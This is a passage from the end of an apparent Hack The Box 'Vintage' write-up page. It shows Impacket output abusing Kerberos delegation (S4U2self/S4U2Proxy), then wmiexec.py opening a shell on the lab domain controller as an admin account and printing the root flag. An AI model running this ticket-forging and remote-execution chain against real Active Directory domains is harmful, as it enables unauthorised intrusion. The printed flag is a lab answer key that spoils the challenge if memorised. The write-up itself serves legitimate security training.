+</span></span><span class=line><span class=cl>/home/ayoub/.local/bin/getST.py:321: DeprecationWarning: datetime.datetime.utcnow<span class=o>()</span> is deprecated and scheduled <span class=k>for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span class=o>(</span>datetime.UTC<span class=o>)</span>.
+</span></span><span class=line><span class=cl>  <span class=nv>now</span> <span class=o>=</span> datetime.datetime.utcnow<span class=o>()</span>
+</span></span><span class=line><span class=cl>/home/ayoub/.local/bin/getST.py:408: DeprecationWarning: datetime.datetime.utcnow<span class=o>()</span> is deprecated and scheduled <span class=k>for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span class=o>(</span>datetime.UTC<span class=o>)</span>.
+</span></span><span class=line><span class=cl>  <span class=nv>now</span> <span class=o>=</span> datetime.datetime.utcnow<span class=o>()</span> + datetime.timedelta<span class=o>(</span><span class=nv>days</span><span class=o>=</span>1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 	Requesting S4U2self
+</span></span><span class=line><span class=cl>/home/ayoub/.local/bin/getST.py:532: DeprecationWarning: datetime.datetime.utcnow<span class=o>()</span> is deprecated and scheduled <span class=k>for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span class=o>(</span>datetime.UTC<span class=o>)</span>.
+</span></span><span class=line><span class=cl>  <span class=nv>now</span> <span class=o>=</span> datetime.datetime.utcnow<span class=o>()</span>
+</span></span><span class=line><span class=cl>/home/ayoub/.local/bin/getST.py:584: DeprecationWarning: datetime.datetime.utcnow<span class=o>()</span> is deprecated and scheduled <span class=k>for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span class=o>(</span>datetime.UTC<span class=o>)</span>.
+</span></span><span class=line><span class=cl>  <span class=nv>now</span> <span class=o>=</span> datetime.datetime.utcnow<span class=o>()</span> + datetime.timedelta<span class=o>(</span><span class=nv>days</span><span class=o>=</span>1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 	Requesting S4U2Proxy
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in L.BIANCHI_ADM.ccache
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>L.BIANCHI_ADM.ccache 
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ wmiexec.py -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> SMBv3.0 dialect used
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Launching semi-interactive shell - Careful what you execute
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
+</span></span><span class=line><span class=cl>C:<span class=se>\&gt;</span>whomai
+</span></span><span class=line><span class=cl><span class=s1>&#39;whomai&#39;</span> is not recognized as an internal or external command,
+</span></span><span class=line><span class=cl>operable program or batch file.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\&gt;</span>whoami
+</span></span><span class=line><span class=cl>vintage<span class=se>\l</span>.bianchi_adm
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\&gt;</span><span class=nb>cd</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;dir
+</span></span><span class=line><span class=cl> Volume in drive C has no label.
+</span></span><span class=line><span class=cl> Volume Serial Number is B8C0-0CD3
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>11/14/2024  07:48 PM    &lt;DIR&gt;          .
+</span></span><span class=line><span class=cl>06/08/2024  03:36 PM    &lt;DIR&gt;          ..
+</span></span><span class=line><span class=cl>03/17/2025  12:02 PM                <span class=m>34</span> root.txt
+</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>34</span> bytes
+</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   5,729,939,456 bytes free
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;type root.txt
+</span></span><span class=line><span class=cl>43fc4b204b904ddc0176ab7493ff5a21
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/markdown/>Markdown</a>
+<a href=/tags/css/>Css</a>
+<a href=/tags/html/>Html</a>
+<a href=/tags/themes/>Themes</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/puppy-htb-writeup/><div class=article-image><img src=/p/puppy-htb-writeup/Puppy.1a569071abf60f67eeef10547fa9591c_hu_d122df57b0412aac.png width=250 height=150 loading=lazy alt="Featured image of post Puppy HTB Writeup" data-hash="md5-GlaQcav2D2fu7xBUf6lZHA=="></div><div class=article-details><h2 class=article-title>Puppy HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/certified-htb-writeup/><div class=article-image><img src=/p/certified-htb-writeup/Certified.0c8ab10b3e65480c87e59dfcae1865e4_hu_6fca3ec18ac781dd.png width=250 height=150 loading=lazy alt="Featured image of post Certified HTB Writeup" data-hash="md5-DIqxCz5lSAyH5Z38rhhl5A=="></div><div class=article-details><h2 class=article-title>Certified HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/administrator-htb-writeup/><div class=article-image><img src=/p/administrator-htb-writeup/Administrator.da995b3c283fa5dd82783f9937ba0fb7_hu_24d318bf208d1bdc.png width=250 height=150 loading=lazy alt="Featured image of post Administrator HTB Writeup" data-hash="md5-2plbPCg/pd2CeD+ZN7oPtw=="></div><div class=article-details><h2 class=article-title>Administrator HTB Writeup</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2025 R4zi0</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
